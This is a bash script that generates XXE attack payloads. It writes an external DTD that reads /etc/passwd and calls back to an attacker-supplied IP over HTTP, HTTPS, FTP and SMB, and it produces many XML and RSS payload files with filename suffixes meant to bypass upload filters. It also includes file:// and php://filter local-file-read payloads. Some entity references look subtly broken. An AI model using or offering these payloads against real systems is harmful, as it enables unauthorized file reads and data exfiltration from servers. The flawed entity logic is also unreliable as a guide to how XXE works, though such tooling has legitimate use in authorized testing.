#!/usr/bin/env bash
set -euo pipefail

# Usage: ./generate_xxe_payloads.sh OUTPUT_DIR [IP]
if [ $# -lt 1 ]; then
    echo "Usage: $0 OUTPUT_DIR [IP]"
    exit 1
fi

OUTDIR="$1"
IP="${2:-127.0.0.1}"

# Service roots
WEB_ROOT="/var/www/html"
FTP_ROOT="/var/shares/ftp"
SMB_ROOT="/var/shares/smb"

# Hosted subdir
HOST_DIR="xxe_files"

# Create directories for hosted files
mkdir -p "$WEB_ROOT/$HOST_DIR" "$FTP_ROOT/$HOST_DIR" "$SMB_ROOT/$HOST_DIR"

# Create external DTD for file retrieval
DTD_CONTENT='<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltr SYSTEM '\''http://'"$IP"'/'"$HOST_DIR"'/exfil.dtd'\''>">
%eval;'

for root in "$WEB_ROOT" "$FTP_ROOT" "$SMB_ROOT"; do
    echo "$DTD_CONTENT" > "$root/$HOST_DIR/external.dtd"
done

# Payload templates
declare -A PAYLOADS=(
    [http]="http://${IP}/${HOST_DIR}/external.dtd"
    [https]="https://${IP}/${HOST_DIR}/external.dtd"
    [ftp]="ftp://${IP}/${HOST_DIR}/external.dtd"
    [smb]="smb://${IP}/${HOST_DIR}/external.dtd"
)

mkdir -p "$OUTDIR"

# Filename suffixes for bypass tests
suffixes=("" ".jpg" "%00.xml" ".XML")

# Generate payload files
for proto in "${!PAYLOADS[@]}"; do
    url="${PAYLOADS[$proto]}"
    # Base file name
    fname="external_${proto}.xml"
    fpath="$OUTDIR/$fname"
    cat > "$fpath" <<EOF
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "${url}">
  %ext;
]>
<root>&exfiltr;</root>
EOF
    # Duplicate with .rss extension
    cp "$fpath" "$OUTDIR/external_${proto}.rss"
    # Bypass suffix variations
    for suf in "${suffixes[@]}"; do
        cp "$fpath" "$OUTDIR/external_${proto}.xml${suf}"
    done
done

# Local file read payloads
local_payloads=(
    "local_file|file:///etc/passwd"
    "php_filter|php://filter/read=convert.base64-encode/resource=/etc/passwd"
    "data_uri|data:text/plain;base64,UElQIENvbnRlbnQ="
)

for entry in "${local_payloads[@]}"; do
    IFS="|" read -r name uri <<< "$entry"
    fname="${name}.xml"
    fpath="$OUTDIR/$fname"
    cat > "$fpath" <<EOF
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "${uri}">
  <!ENTITY data "\&xxe;">
]>
<root>&data;</root>
EOF
    # Bypass suffixes and .rss copy
    cp "$fpath" "$OUTDIR/${name}.rss"
    for suf in "${suffixes[@]}"; do
        cp "$fpath" "$OUTDIR/${name}.xml${suf}"
    done
done

echo "✅ XXE payloads generated in $OUTDIR"
